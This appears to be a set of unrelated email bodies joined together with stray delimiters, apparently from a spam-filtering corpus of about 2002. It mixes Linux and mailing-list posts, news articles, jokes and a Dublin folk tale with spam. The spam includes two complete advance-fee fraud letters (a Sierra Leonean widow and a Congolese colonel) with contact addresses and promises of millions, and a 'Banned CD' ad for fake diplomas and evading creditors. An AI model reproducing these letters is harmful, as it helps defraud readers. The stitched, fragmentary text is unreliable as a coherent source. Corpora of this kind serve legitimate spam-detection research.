 It will take a good while (a year, or two) before we can trust anything
 else.

 Have you looked inside a dual-CPU 1U Dell? Three drives are easy to get 
 in. Anything else would require a redesign, and would in nontrivial 
 thermal engineering issues.

 I can't think of a single major vendor who sells 1U systems with hardware
 EIDE RAID.

 I believe you that stuff can be found, if one is looking for it. However, 
 I wouldn't put this into production unless I've had that system hanging in 
 the local rack under simulated load for a half a year.

 Yeah, I learned by hearing exmh users scream in agony.  Sorry about
 all that.  We should be able to clean this up.  If you grep for
 ""bind"" in seditBind you quickly find the Text_Selection proc
 I described in the previous email.

 The property market is moving very fast in Spain and frankly many estate agents do not have the time to update their web sites.
 
 What you need is a company that can find you property that is actually for sale and can present you with a selection of current properties that specifically fit your requirements.
 
 Just think of how much time and effort that would save you!

","Dear Sir, 
 With due respect and humility I write you this letter which I believe you
 would
 be of great assistance to my children and I.
 I got your contact through my husband commercial address book and believed
 that
 you must be a trust worthy and reliable person that will not like to
 intimidate me
 or betray my trust after hearing this news. I am a native of KONOBO in the
 KEREMA
 local district of SIERRA LEONE in West Africa and the wife of Late DR.
 MUNDI A.
 KOJO who was assassinated by the rebel forced loyal to Major John Paul
 Koromah
 because he was the Director General National Gold and Diamond Mining
 Corporation
 of Sierra Leone. Few days before my husband was assassinated, he 
 instructed me
 and my children (Ibrahim and Amina) to move out of Sierra Leone immediately,
 before the powerful Economic community of West African States (ECOMOG)
 forces
 intervened, which eventually resulted into a brutal civil war. My children
 and I
 managed to escape to Togo through the help of my husband's friend. We came
 into
 Togo with some valuables including a cash sum of $25MILLION(TWENTY FIVE
 MILLION
 UNITED STATES DOLLARS ONLY) in two trunks boxes which I have deposited
 with a
 Trust Company here in Togo and special arrangement has been made with the
 currier
 company who will freight the money to your country.
 Meanwhile, I want to leave Togo entirely with this money for investment in
 your
 country because of a stable political situation there and mostly for the
 future of
 my children. I want you to please assist us to claim this fund from the
 Trust
 Company in any of their branches in Europe, after which the fund will be
 deposited
 into your account for investment in your country. You should also help us to
 source for good investment opportunity so that we can invest wisely in your
 country when the fund is finally confirmed in your account.
 We have it in mind to reward you handsomely for your assistance as we have
 resolved to give you 20% of the total sum for your help. But due to how I
 am being
 monitored by the Sierra Leonean Government Secret Agents, I will advice
 you to
 have the 
 deal concluded with my son (IBRAHIM KOJO). Please contact my son on this
 email:
 ibrahimkojo@caramail.com , immediately you receive this letter to enable us
 proceed in earnest towards retrieving the consignments and transferring
 same into
 your account.
 Your private Fax and Phone is needed in this transaction for private
 discussions. 
 Note: There is no risk involved in this business. 
 Remain Blessed, 
 MRS. ANNE  KOJO

 But some plonker will come up with yet another computer model
 predicting global warming and storms and floods in 50 years even
 though it can't predict next week's weather.  And predict widespread
 cooling in some parts of the globe (which is now part of global
 ""warming"").  And will get plenty of publicity for even more conclusive
 scaremong^H^H^H^H^H^H^H^H^H proof.

 Umpteen studies have already shown that temperature variations, when
 even detectable in the noise, go either way depending on which data
 you look at.

 One study from Vienna showed long-term warming from thermometers at
 the airport, and none from other sites.  Another study with data from
 Antarctica which was touted as supporting global warming while being
 free from this urbanization effect later turned out to be dominated by
 the time of day at which the airplane that made the measurements flew

     Load BOTH mesa, mesa-demos and basically everything that comes in the mesa rpm.

 Stop Those Presses! Blonds, It Seems, Will Survive After All
 
 October 2, 2002
 By LAWRENCE K. ALTMAN 
 
 
 
 
  
 
 Apparently it fell into the category ""too good to check.""
 
 
 Last Friday, several British newspapers reported that the
 World Health Organization had found in a study that blonds
 would become extinct within 200 years, because blondness
 was caused by a recessive gene that was dying out. The
 reports were repeated on Friday by anchors for the ABC News
 program ""Good Morning America,"" and on Saturday by CNN. 
 
 There was only one problem, the health organization said in
 a statement yesterday that it never reported that blonds
 would become extinct, and it had never done a study on the
 subject. 
 
 ""W.H.O. has no knowledge of how these news reports
 originated,"" said the organization, an agency of the United
 Nations based in Geneva, ""but would like to stress that we
 have no opinion of the future existence of blonds."" 
 
 All the news reports, in Britain and the United States,
 cited a study from the World Health Organization - ""a
 blonde-shell study,"" as The Daily Star of London put it.
 But none reported any scientific details from the study or
 the names of the scientists who conducted it. 
 
 On ""Good Morning America,"" Charles Gibson began a
 conversation with his co-anchor, Diane Sawyer, by saying:
 ""There's a study from the World Health Organization, this
 is for real, that blonds are an endangered species. Women
 and men with blond hair, eyebrows and blue eyes, natural
 blonds, they say will vanish from the face of the earth
 within 200 years, because it is not as strong a gene as
 brunets."" 
 
 Ms. Sawyer said she was ""somewhat of a natural blonde.""
 
 
 Jeffrey Schneider, a spokesman for ABC News, said the
 anchors got the information from an ABC producer in London
 who said he had read it in a British newspaper. 
 
 In London, The Sun and The Express both reported that
 unnamed scientists said blonds would survive longest in
 Scandinavia, where they are most concentrated, and expected
 the last true blond to hail from Finland. 
 
 The British accounts were replete with the views of
 bleached blonds who said hairdressers would never allow
 blondness to become extinct, and doctors who said that rare
 genes would pop up to keep natural blonds from becoming an
 endangered species. 
 
 Journalists in London said last night that the source of
 the reports was probably one of several European news
 agencies that are used by the British press, but it
 remained unclear which one. 
 
 Tim Hall, a night news editor at The Daily Mail, said the
 report was probably distributed by The Press Association,
 Britain's domestic news agency. ""Several papers picked it
 up,"" he said. 
 
 But Charlotte Gapper, night editor at The Press
 Association, said that although it had considered running
 the report on Sept. 27, it had decided not to after talking
 to the World Health Organization. 
 
 ""We didn't do that story because we made an inquiry to the
 World Health Organization first,"" she said. ""They told us
 that report was two years old, and had been covered at the
 time. They said it had been picked up again that day by a
 German news agency."" 
 
 She added that she did not know which agency the
 organization was referring to. 
 
 Dr. Ray White, a geneticist at the University of California
 at San Francisco, said that the disappearance of a gene for
 blond hair ""sounds patently incorrect.""

505,"Subject: Re: The Curse of India's Socialism
","I think that this and other articles confuse Socialism with 
 Bureaucracy.  Libertarianism as implemented in North America is not 
 exactly the shining pinnacle of economic efficiency.
 
 Just try starting a telephone company in the US or (even worse) 
 Canada.  It can take a year or more to get the blessing of our own 
 ""Permit Rajs"" at the FCC, PUC, and PTTs (or, in the decidedly more 
 socialist leaning Canada, Industry Canada and the CRTC).
 
 Yet, despite all of this intense regulation and paper pushing, as 
 well as regulatory scrutiny by the FTC, SEC, and IRS, the 
 executives of Telecom Companies have managed to bilk the investment 
 community for what looks to be tens of billions of dollars.  They 
 finished their routine with the a quadruple lutz -- laying off 
 hundreds of thousands of workers when it all came crashing down.
 
 So.. tell me again.. how are we better off?

 Back when 64KB was more memory than any computer would ever need, there was a 
 time when memory managers didnt exist. But gradually, new computer systems 
 came out with larger amounts of memory and designers discovered ways to eat up 
 RAM faster than any system could dish it out. This discussion is based on

 Which means the sender has a list of who the true
 targets are, and who the fake targets are, and
 scripts for mixing these. On the receiving side,
 my email client distinguishes between messages
 that are read, and messages that are not. I like
 to mark or save messages that are particularly
 interresting or important to me. And even if I
 make a point to delete ""suspicious material""
 immediately upon reading it, even THAT might
 leave an interesting kind of trace on my machine.
 
 Sorry, but I don't buy the argument that spam
 protects people who want to distribute or see
 material the government disapproves.

","My gut reaction would be to tell them to go and shite, but this might not help to solve the problem. People who do horsey gigs get insurance because they can prove that they are 'expert'. They can then get a quote. What about finding out what they are prepared to insure, and then tell them that you are pulling in your horns and will do what you are insured to do, and make sure no one chops up any one else.
 Best of luck

 Hi, Ben,
 
 it seems, the RH freetype package should be repacked,
 see for this
 https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=74415
 
 Please, can you atach and send your sucessfully rebuild of the RH freetype
 rpm with the bytecode enabled to me?

 You could also change your e-mail to a more responsible provider. If Eircom
 are not up to scratch, then use somebody else and make sure you let Eircom
 know why you think they are so useless. You can still keep your old e-mail
 address if you have to.
 
 To suggest that ISP's should not protect themselves against incompotent

 The Cobalt systems have some neat firmware boot code that will read the
 ext2 filesystem and find the kernel itself... if you put it exactly where
 they expect it.

 Actually, this issue used to escalate into a religious war. The ""From "" 
 envelope is an artifact of the mbox mailbox format, and from that 
 perspective it should be the mail server that stores its mailboxes in
 mbox format that should be responsible for escaping lines beginning with 
 ""From "". On the other hand, this breaks the assumption that the mail 
 transport only touches the message headers and leaves the message body 
 alone.
 Things like pgp signatures break when the mail server changes the message 
 body.
 
 Also, strictly speaking, the mbox format envelope (or for us old-timers, 
 the UUCP envelope) isn't just any line beginning with ""From "". It's really 
 ""From"", a single space, a valid email address, two spaces, and a valid 
 date.
 For example:
 
     From ptardif@nbnet.nb.ca  Sun Jul 14 08:53:57 2002

","*****************BANNEDCD::::::::::::::::::::::::::::::::::>NET******************
 
 I have been receiving emails saying that I'm contributing to the ""moral decay of society"" by selling the Banned CD.  That may be, but I feel strongly that you have a right to benefit from 
 this hard-to-find information. 
 
 So I am giving you ONE LAST CHANCE to order the Banned CD! 
 
 With this powerful CD, you will be able to investigate your friends, enemies and lovers in just minutes using the Internet.  You can track down old flames from college, or you can dig up some dirt on your boss to make sure you get that next promotion! 
   
 
 Or maybe you want a fake diploma to hang on your bedroom wall.  You'll find addresses for companies that make these diplomas on the Banned CD. 
 
 Need to disappear fast and never look back?  No problem! 
 Using the Banned CD, you will learn how to build a completely 
 new identity. 
 
 Obviously, the Powers That Be don't want you to have the Banned CD.  They have threatened me with lawsuits, fines, and even imprisonment unless I stop selling it immediately. But I feel that YOU have a Constitutional right to access this type of information, and I can't be intimidated. 
 
 
  Uncle Sam and your creditors are horrified that I am still selling this product!  There must be a price on my head! 
 
 Why are they so upset? Because this CD gives you freedom. 
 And you can't buy freedom at your local Walmart.  You will 
 have the freedom to avoid creditors, judgments, lawsuits, IRS 
 tax collectors, criminal indictments, your greedy ex-wife or 
 ex-husband, and MUCH more!

 **Dublin**: something from the archives.    Daev Walsh forwards an article from
 The Irish Digest about ''Billy in the Bowl''.  This story is also immortalised
 in an old Dublin song, which in turn was mentioned in a Pogues track.  Billy
 was a legless beggar in the alleys of Stoneybatter and Grangegorman (where I
 now live) during the 18th century, who discovered a new, but not entirely
 legal, way to make money.

 Subject:      The Case of the Stoneybatter Strangler
 
 A story of my new neighbourhood...
 
 
 The Irish Digest July 1964
 
 
 The Case of the Stoneybatter Strangler
 
 The handsome, deformed Billy in the Bowl evolved a plan to rob his donors.
 Then, one night, he made the biggest mistake of his life 
 
 DUBLIN in the eighteenth century was noted for two things - the
 architectural beauty of its public buildings and the large number of
 beggars who sought alms in its maze of streets and lanes.  Many of these
 beggars relied on visitors and the gentry for their coin, but there was one
 who campaigned among the working class.  This was ""Billy In The Bowl""
 
 The strange appellation was derived from the fact that Billy's sole means
 of transport was a large bowl-shaped car with wheels.  Seated in this ""
 bowl "", the beggar would propel himself along by pushing against the ground
 with wooden plugs, one in each hand.
 
 Billy's unusual means of conveyance was vitally necessary, as he had been
 born without legs.  Nature, however, had compensated for this by endowing
 him with powerful arms and shoulders and, what was most important, an
 unusually handsome face.
 
 This was Billy's greatest asset in his daily routine of separating
 sympathetic passers-by from their small change.
 
 The cunning young beggar would wait at a convenient spot on one of the many
 lonely roads or lanes which were a feature of eighteenth century
 Grangegorman and Stoneybatter, until a servant girl or an old lady would
 come along.
 
 He would then put on is most attractive smile which, together with his
 black curly hair, never failed to halt the females.  The fact that such a
 handsome young man was so terribly handicapped physically always evoked pity.
 
 ""Billy in the Bowl"", however, wasn't satisfied with becoming the daily
 owner of a generous number of small coins; what his greed demanded were
 substantial sums of money.  The more he managed to get the more he could
 indulge in his pet vices - gambling and drinking.
 
 As a result the beggar evolved a plan to rob unsuspecting sympathisers.
 The first time lie put his plan into operation was on a cold March evening
 as dusk, was falling.  The victim was a middle aged woman who was passing
 through Grangegorman Lane on her way to visit friends in Queen Street - on
 Dublin's North Quays.
 
 When Billy heard the woman's footsteps, he hid behind some bushes in a
 ditch which skirted the lane.  As his unsuspecting victim drew close, the
 beggar moaned and shouted, and cried out for help.
 
 Trembling with excitement, the woman dashed to the spot where Billy lay
 concealed.  She bent down to help the beggar out of the ditch, when two
 powerful arms closed around her throat and pulled her into the bushes.
 
 In a few minutes it was all over.  The woman lay in a dead faint, and Billy
 was travelling at a fast rate down the lane in his "" bowl "", his victirn's
 purse snug in his coat pocket.  An hour after the robbery the woman was
 found in a distracted condition, but failed to give a description of her
 assailant.  And, as ""Billy in the Bowl"" had figured, nobody would suspect a
 deformed beggar.
 
 Again and again the beggar carried out his robbery plan, always shifting
 the place of attack to a different part of Grangegorman or  Stoneybatter.
 
 On one occasion "" Billy in ""the Bowl "" tried his tactics on a sturdy
 servant girl who put up such a vigorous resistance that he was forced to
 strangle her.  The incident became known as the 11 Grangegorman Lane Murder
 and caused a great stir.
 
 Hundred.s flocked to the scene of the crime and for a couple of months
 ""Billy in the Bowl"" was forced to desert his usual haunts.  Around this
 period, Dublin's first-ever police force was been mobilised, and the first
 case they were confronted with was the Grangegorman lane murder.
 
 Months passed and  ""Billy in the Bowl"" reverted once again to his old
 pasttime.  A number of young servant girls were lured into ditches and
 robbed, and the police were inundated with so many complaints that a
 nightly patrol was placed on the district.  But the beggar still rolled
 along in his ""bowl"" pitied and unsuspected.  Then came the night that
 finished Billy's career of crime.
 
 Two stoudy built female cooks, trudging back to their places of employment
 after a night out in the city, were surprised and not a little shocked to
 hear shouts for help.  Rushing over, they came upon a huddled figure in the
 ditch.
 
 Billy, thinking there was only one woman, grabbed one of the cooks and
 tried to pull her into the ditch.  She proved much too strong for him,
 however) and while resisting tore 'at his face with her sharp finger-nails.
 
 Meanwhile, her companion acted with speed and daring.  Pulling out her
 large hatpin she made .for the beggar, and plunged the pin into his right eye.
 
 The screams and howls of the wounded beggar reverberated throughout the
 district and brought people dashing to the scene.  Among them was a member
 of the nightly police patrol who promptly arrested the groaning Billy.
 
 ""Billy in the Bowl"" was tried and sentenced for robbery with violence, but
 they could never prove it was he who had strangled the servant girl.  The
 Grangegorman-Stoneybatter district became once again a quiet, attractive
 Dublin suburb where old ladies strolled, and carefree servant girls laughed
 and giggled as they wended their way home at night.

 Internet can level the political playing field
 By Mike McCurry and Larry Purpuro
 
 NOT many months from now, people across the country will experience one 
 of the great recurring features of American democracy. At shopping 
 malls, on factory floors, at church socials and even on our front 
 stoops, we will be approached by individuals who want to represent us in 
 public office. While chances are high that we won't know them 
 personally, they will walk up to us, offer a handshake and a flier and 
 ask for our votes.
 
 Just as technology is affecting every other area of communication, it 
 has begun to affect the way political candidates communicate with voters.
 
 In this year's GOP gubernatorial primary, California Secretary of State 
 Bill Jones, who faced better-funded candidates, acquired the e-mail 
 addresses of more than a million potential California voters and sent 
 each an unsolicited e-mail asking for support.
 
 That day, he might have chosen any of the more traditional -- and more 
 expensive -- methods of contacting voters, such as direct mail, radio 
 spots or TV ads. But he spent only about 2 cents per message, instead of 
 35 cents or more per message for direct mail or in another medium.
 
 Had Jones chosen direct mail, radio or TV, that communication would have 
 been equally ``unsolicited,'' as defined in the e-mail world. Few voters 
 would have ``opted in'' to receive campaign information from Jones 
 through any of those channels.
 
 The response to Jones' e-mail effort, however, was swift and intense. He 
 was lambasted by anti-spam advocates, and media coverage was almost 
 entirely negative. To be fair, some of Jones' tactics could have been 
 refined. He used a less-than-perfect list and no standard-practice 
 ``paid for'' disclaimer in the message.
 
 His detractors, however, attacked him not for his tactical miscues but 
 because the e-mail was sent unsolicited. In fact, Jones' online campaign 
 may have been his most visible asset. In an era of cynicism toward money 
 in politics -- money typically spent on other unsolicited communication 
 mediums -- Jones tried to level the playing field.
 
 No one likes commercial spam. It is irrelevant and untargeted and can be 
 highly intrusive and even offensive. But as a sophisticated society, 
 it's time to differentiate commercial spam from very different 
 unsolicited e-mail sent by political candidates to voters.
 
 The debate is particularly relevant in light of legislation in Congress 
 that would constitute the first federal law to directly address spam. We 
 believe e-mail is no more intrusive than direct mail, telemarketing or 
 TV advertising when it comes to politicians seeking to reach voters. A 
 simple link in good e-mail campaigns allows recipients to opt out of 
 future mailings. Direct mail takes at least a phone call or stamp to be 
 taken off a list, and viewers must repeatedly endure TV ads.
 
 When a candidate lacks a large campaign war chest, he or she can use the 
 Internet to provide constituents with information to better prepare them 
 to perform their civic duty of casting educated votes. With more than 60 
 percent of all potential voters in this country possessing e-mail 
 accounts, it makes sense that political candidates use this medium.
 
 Candidates might avoid some of the tactical problems encountered by the 
 Jones campaign if they use the technologies available today that better 
 ensure quality of e-mail lists and target content to specific recipient 
 groups.
 
 But the broader point remains. When a political candidate sends a voter 
 an e-mail, that recipient can choose to delete the message without 
 opening it, unsubscribe from the list, read it or even reply and engage 
 the sender. That choice should belong to the voter -- not to anti-spam 
 advocates whose efforts are better focused on commercial e-mail. 
 Political candidates should be free to communicate with voters as best 
 they can, and let voters decide what to do with that information.

 Mike McCurry, former press secretary for President Clinton, is CEO of an 
 advocacy management and communications software company. Larry Purpuro, 
 the former Republican National Committee deputy chief of staff, is 
 founder and president of a political e-marketing firm. This was written 
 for the Los Angeles Times.

  If you think you can survive it, please fight... When I found that patent I
 found others that were just common sense, things that any geek could implement
 with his script/shell-language of choice; and it's time for someone to get the
 medias attention on what's going on.
  Basically this is the new wave of ""namenappers""; it used to be domainnames,
 not it's all the basic general ideas they can think off/find on the web that
 they're patenting.

 That's clearly the same bug.
 
 I don't think I can fix it either...I certainly can't while my copy of Brent's

   It's been about 20 years since a new Atari 400 or Commodore Vic
 20 could be had for less than $200. Even then, those relics were
 well on their way from bargain bins to the dust bin of PC history.
   Since then, few if any new computers have sold for less than
 $200. Any that did were seriously outdated or inoperable.
   Now, in a challenge to established tech giants, several upstarts
 have banded together to create a PC that retails for $199.86.
   It doesn't do Windows. In fact, it doesn't do a lot of things.
   The Microtel SYSMAR710, sold only at Wal-Mart's online store,
 runs on a Linux operating system variant called Lindows, which has
 been hyped as a new choice for consumers who want to break away
 from the Microsoft monopoly.

 I'd just like to recommend the newest Viz to ukers just for the hilarious ""David 
 Blaine: Stalag Magician"".  The ego'd one is in a WWII prison camp and sort of 
 trying to escape.  Several times he seems to have escaped and the british 
 officers celebrate before it's revealed he's been buried alive or hiding in a 
 freezer.  At one point he's asked why and says ""Well it's not for publicity"" 
 Cracking stuff.

 Rendering polygons is not as easy as it used to be, the reason being the vast 
 amount of different rendering techniques, methods and algorithms available. Not 
 only is choosing the right ones a problem, even worse, all that are selected 
 need to work together. There are some algorithms which simply do not work 
 together, and in that case, only one may be used whilt the other one needs to 
 be replaced witha more compatible method. This feature explores how Factor 5 
 approached the problem when developing Rogue Leader for Gamecube.

 That reminds me of a Robin William's routine from the 80's concerning his 
 witnessing of the birth of his son (back in the day, the presence of dad 
 on the OB floor was still, well, rather Marin-ish).

 Well, you have a pretty good idea of when I might get to it (the

 Thanks for considering it.  In the meantime I've set the

 As Dan said -- it's a hard corpus, made harder without the spamtrap data.
 
 Also -- and this is an important point -- those measurements can't be
 directly compared, because I changed the methodology.  In 2.40 the scores
 were evolved on the entire corpus, then evaluated using that corpus; ie.
 there was no ""blind"" testing, and the scores could overfit and still
 provide good statistics.
 
 In 2.42, they're evaluated ""blind"", on a totally unseen set of messages,
 so those figures would be a lot more accurate for real-world use.

 however, how do you add features? eg tagged commands, udma100, 133,

 lots of drives and chips have bugs, which need working around.
 
 all that said, Linus says he does his development on an IDE machine

 I've sent in some spam that either didn't score or scored practically 
 nothing, like below 5.  I figure that most people run at 5 so if it 
 scores less than that, a rule needs to be honed to catch it.

 Hmmm... I don't see any :-)
 
 My main concern is that when rebuilding the recent packages I've made for
 Psyche on Valhalla, I'd need to lower the ""Release:"" tag (to keep an
 upgrade working), and that would f*ck up my CVS repository which is on my
 Valhalla box (well, I'm exagerating, It'll just make it more difficult for
 me) ;-)
 Sure, there are easy ways around this, but the easiest for me will be to
 wait until I upgrade my main box to Psyche and have Valhalla only on a
 secondary rebuild system.

 I wouldn't say that the societies of humans here before European occupancy
 was 'lifted' by free xyz. Perhaps 'replaced' or 'sunk' or some other
 description, but not 'lifted'. Also, the lifestyle of the remnants of those
 societies is on average only marginally above poverty even today.

 Fluxbox is yet another windowmanager for X.
 It's based on the Blackbox 0.61.1 code. Fluxbox looks like blackbox and 
 handles styles, colors, window placement and similar thing exactly like 
 blackbox (100% theme/style compability).
 Many changes and improvements have been made to the code, such as window tabs, 
 iconbar, native keygrabber, gnome and kde support etc.

 Now here is a thought: a Unix version of the ""Deleted Items"" folder.
 
 In the root of a hard drive, create a directory "".unwanted"". Then
 periodically create hard links to every file on the hard drive that does not
 have hard links.
 
 That way, when someone accidentally does ""rm *"" or whatever, you still have
 a link under "".unwanted""
 
 Another script can then periodically clear out enough old files to ensure
 that there is usually enough disk space.
 
 Although this sounds like a horrible hack. It would no doubt be much better
 to have a transaction oriented file system with a rollback facility.  :)

 That's very perceptive of you.  Many people are not so willing to
 accept their personal reality as skewed by their neuro-physiology.  A
 great many popular con games exist by exploiting the perceptions of
 these states.
 
 Another oft-exploited neuro-plausibility: The brain is a pretty darn
 fine analog associative computer, so it could be the neurochemical
 events during the dream have associated themselves with some inner or
 external cue to mentally _recreate_ the state-perception like the
 predictable tone on striking a bell.

 how's about the String Joke?
 
 A piece of string and his friend walks into a bar.  The barman says
 ""sorry, we don't serve string here"".  String & friend walk out
 (grumbling).  String asks friend ""listen, could you tatter my ends and
 tie me up?""  Friend obliges, and they return; barman says ""aren't you
 that piece of string I threw out?""  ""No, I'm a frayed knot.""

 Well, the 7.3 binary should work as long as you install the ""rpm404"" (IIRC)
 compatibility library. The only problem I have with some rpm 4.1 versions
 is that it sometimes hangs at the and of operations (-e, -i, -F or -U) and
 the only workaround is to kill it, ""rm -f /var/lib/rpm/__*"" and try again.

 Sean Connery was interviewed by Michael Parkinson, and bragged that
 despite his 72 years of age, he could still have sex three times a
 night.
 
 Lulu, who was also a guest, looked intrigued.
 
 After the show, Lulu said, ""Sean, if Ah'm no bein too forward, Ah'd love
 tae hae sex wi an aulder man. Let's go back tae mah place.""
 
 So they go back to her place and have great sex. Afterwards, Sean  says,
 ""If you think that was good, let me shleep for half an hour, and we can
 have even better shex. But while I'm shleeping, hold my baws in your
 left hand and my wullie in your right hand.""
 
 Lulu looks a bit perplexed, but says, ""Okay.""
 
 He sleeps for half and hour, awakens, and they have even better sex.
 Then Sean says, ""Lulu,  that was wonderful. But if you let me shleep
 for an hour, we can have  the besht shex yet. But again, hold my baws
 in your left hand, and my wullie in your right hand.""
 
 Lulu is now used to the routine and  complies.
 
 The results are mind blowing. Once it's all over, and the cigarettes
 are lit, Lulu asks ""Sean, tell me, dis mah haudin yer baws in mah left

 *Motions Filed in Morpheus Peer-to-Peer Case
 Judge to Consider Legality of Gnutella Software
 
 Los Angeles - Attorneys for StreamCast Networks, developers of the
 popular Morpheus peer-to-peer (P2P) file sharing software, filed
 briefs in federal court on Monday seeking a ruling that distribution
 of the software does not violate copyright law.
 
 Morpheus is a popular file-sharing application based on the
 decentralized Gnutella P2P networking protocol.
 
 In their briefs seeking summary judgment, attorneys from the
 Electronic Frontier Foundation (EFF) and the law firm of Brobeck,
 Phleger and Harrison argued that distribution of the software is legal
 because the product is capable of substantial noninfringing uses and
 because StreamCast cannot control the various uses of the software.
 
 Supporting StreamCast in the motion is nine time Grammy nominee Janis
 Ian, who believes that peer-to-peer software represents important new
 opportunities for artists.
 
 On October 2, 2001, 28 of the world's largest entertainment companies
 sued StreamCast for the allegedly infringing actions of users of its
 product (MGM et al v. Grokster et al, Case No. 01-CV-8541 SVW).
 
 Additional briefs will be filed in the months to come, with oral
 arguments set for December 2, 2002, before U.S. Federal District Court
 Judge Stephen Wilson in Los Angeles.

 *Electronic Frontier Foundation Holds Second Annual Share-In
 John Perry Barlow, Mountain Girl Garcia Host Free Music Fest
 
 San Francisco - Join the Electronic Frontier Foundation and five Bay
 Area bands for an afternoon of live music and outdoor fun at EFF's
 second annual Share-In. The festival will be held in Golden Gate
 Park's Music Concourse Bandshell on Saturday, September 14th from noon
 - 5pm. The celebration of independent music will be hosted by Grateful
 Dead lyricist and EFF co-founder John Perry Barlow and former wife of
 the late great Jerry Garcia, Mountain Girl Garcia.
 
 Artists participating in this event will permit recording of their
 performances by those in attendance in support of EFFs Open Audio
 License (OAL). Musicians performing at the event include: the Box Set
 Duo - clown princes of folk-rock, the classic funk band Funkmonsters,
 celtic world-fusion group Hy Brassyl, harmony based folk-pop band
 Atticus Scout, and Berkeley-based party band Shady Lady.
 
 In addition to music, the Share-In will feature performers including
 Ashley Foster the One Wheeled Wonder, the Existential Circus,
 Frantastic Hands, the Metronome Dancers, and Willy Bologna and his
 Sideshow Circus. Bring your family and friends!
 
 Ben and Jerry's will sell their famous ice cream, and Cartwheel
 Catering will be on site with hot dogs, pretzels, and churros.
 
 Proceeds from the Share-In will go directly to EFF's Campaign for
 Audiovisual Free Expression (CAFE), which oversees projects such as
 the Open Audio License. CAFE empowers the creative community in
 cyberspace by protecting the public's access to and use of audiovisual
 technologies.
 
 The Open Audio License is a tool that EFF has developed in order to
 help artists share music more directly with their fans, without
 sacrificing recognition for their creativity. The OAL encourages
 collaboration, providing artists with an alternative to a business
 model strictly driven by profit. Based on the open source and free
 software initiatives for software development, the OAL encourages
 artists to share with one another and their fans
 
 Adoption of the OAL does not mean that artists go unrewarded for their
 work. On the contrary, the OAL permits artists to share single tracks
 or performances and gain widespread recognition for their work without
 relying on intermediaries. EFF encourages new models of music
 distribution in the digital world that benefit the artists themselves.
 The Internet makes it possible to drastically reduce the overhead for
 packaging and distributing music, which is where record companies
 currently spend most of the money that could be going to artists. EFF
 is committed to developing tools that empower artists to take control
 over their own art and to be compensated appropriately for their works.
 
 When: Saturday, September 14th, Noon-5pm
 
 Where: Music Concourse Bandshell in Golden Gate Park, near the
 Japanese Tea Gardens between MLK Drive and JFK Drive

","Can anyone access the CVS server for exmh?
 The last thing I was able to do was try a ""cvs commit"", but

","I did more testing with your patch on top of today's CVS, but the patch
 didn't help at all.
 The following is the results of the tests:
 
 Testing setup:
 1. created a ""/dev/md0"" with 4 scsi disks
 2. created a LVM Volume group ""vg"" with the ""/dev/md0""
 3. created a LVM logical volume ""vol1"" with ""vg""
 4. created a XFS fs with a command:
     mkfs.xfs -f -d sunit=8,swidth=8 /dev/vg/vol1

 Test results:
 1. mount with quota enabled => occasional kernel oops, attached the file
 oops1
 2. mount without quota enabled => occasional kernel oops, attached the file
 oops2
 3. mount without quota enabled, while md device is in degraded mode =>
 always kernel oops, attached the file oops3

 The ""--define"" is exactly what I was looking for! I was trying to
 figure out a way to do it within the mechanism of rpm (like the
 ""--with"" switches), but for some reason didn't think of using
 ""--define"". My computer is currently gone for repairs, but once it's
 back, I'll rewrite the specfile, add support for kernel-smp, and email
 it to the list for further criticism :)
 
 As far as requiring kernel-source, I don't feel it's a big problem. If
 you're gonna go to the trouble of packaging custom kernels into rpms,
 it's not a far stretch to package the source tree too (as I currently
 do).
 
 Also, I've found that the alsa-driver source needs a usb-related patch 
 to compile under the latest test kernels (2.4.20-preX). Are other 
 people seeing the same thing, or is this just a problem with my setup?
 
 gary
 
 P.S. If I didn't mention it before, thanks for the alsa packages! They 
 greatly simplified what used to take way too long before.

 Gack. Did you try 7.3 with the compat-glibc first? Or does it require an

","FROM: COL. MICHAEL BUNDU. 
 DEMOCRATIC REPUBLIC OF CONGO. 
 Tel No: Your country Intl. access code +8821652098236
 email : mikebundu@rediffmail.com
 Dear Sir/Madam
 
 
 SEEKING YOUR IMMEDIATE ASSISTANCE. 
 
 Please permit me to make your acquaintance in so informal a manner. This
 is necessitated by my urgent need to reach a 
 dependable and trust worthy foreign partner. This request may seem strange
 and unsolicited but I crave your indulgence 
 and pray that you view it seriously. My name is COL. MICHAEL BUNDU of the
 Democratic Republic of Congo and one of 
 the close aides to the former President of the Democratic Republic of
 Congo LAURENT KABILA of blessed memory, may 
 his soul rest in peace. 
 
 Due to the military campaign of LAURENT KABILA to force out the rebels in
 my country, I and some of my colleagues were 
 instructed by Late President Kabila to go abroad to purchase arms and
 ammunition worth of Twenty Million, Five Hundred 
 Thousand United States Dollars only (US$20,500,000.00) to fight the rebel
 group. We were then given this money privately 
 by the then President, LAURENT KABILA, without the knowledge of other
 Cabinet Members. But when President Kabila 
 was killed in a bloody shoot-out by one of his bodyguards a day before we
 were schedule to travel out of Congo, We 
 immediately decided to put the funds into a private security company here
 in Congo for safe keeping. The security of the 
 said amount is presently being threatened here following the arrest and
 seizure of properties of Col. Rasheidi Karesava 
 (One of the aides to Laurent Kabila) a tribesman, and some other Military
 Personnel from our same tribe, by the new 
 President of the Democratic Republic of Congo, the son of late President
 Laurent Kabila, Joseph Kabila. 
 
 In view of this, we need a reliable and trustworthy foreign partner who
 can assist us to move this money out of my country 
 as the beneficiary. 
 WE have sufficient ''CONTACTS'' here to move the fund under Diplomatic
 Cover to a security company in Europe in your 
 name. This is to ensure that the Diplomatic Baggage is marked
 ''CONFIDENTIAL'' and it 
 will not pass through normal custom/airport screening and clearance. 
 
 Our inability to move this money out of Congo all this while stems from
 our lack of trust of our supposed good friends 
 (western countries) who suddenly became hostile to those of us who worked
 with the late President Kabila, immediately 
 after his son took office. Though we have neither seen nor met each other,
 the information We gathered from an associate 
 who has worked in your country has encouraged and convinced us that with
 your sincere assistance, this transaction will 
 be properly handled with modesty and honesty to a huge success within two
 weeks. The said money is a state fund and 
 therefore requires a total confidentiality. 
 
 We would please need you to stand on our behalf as the beneficiary of this
 fund in Europe. This is because we are under 
 restricted movement and watch and hence we want to be very careful in
 order not to lose this fund which we have worked 
 so hard for. Thus, if you are willing to assist us to move this fund out
 of Congo, you can contact me through my email 
 addresses, Tel/Fax nos. above with your telephone, fax number and personal
 information to enable us discuss the 
 modalities and what will be your share (percentage) for assisting us.
 
 Please note that There are no RISKS involved in this Deal as everyone's
 Security is Guaranteed if we follow the required 
 guidelines. I will hence furnish you with further details of this Deal as
 soon as I am assured of your Sincere interest to assist 
 us. 
 
 I must use this opportunity and medium to implore you to exercise the
